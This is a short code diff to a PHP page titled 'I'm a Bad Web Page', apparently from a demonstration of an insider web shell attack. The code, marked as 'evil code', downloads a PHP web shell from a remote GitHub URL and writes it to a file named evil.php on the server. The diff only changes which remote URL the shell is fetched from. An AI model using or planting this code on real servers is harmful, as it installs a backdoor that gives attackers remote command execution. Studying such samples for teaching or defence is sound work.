@@ -96,7 +96,7 @@ I'm a Bad Web Page
 
 <?php // Normal code  echo "Whatsupppp";   
 // start of evil code 
-$code = file_get_contents("https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/9377612eeea89aed2b226a870e76ac12965d6694/easy-simple-php-webshell.php"); 
+$code = file_get_contents("https://raw.githubusercontent.com/scottbrumley/insider-webshell-attack/main/evil.php"); 
 $myfile = fopen("evil.php", "w+") or die("Unable to open file!");   
 fwrite($myfile, $code);  
 fclose($myfile);  
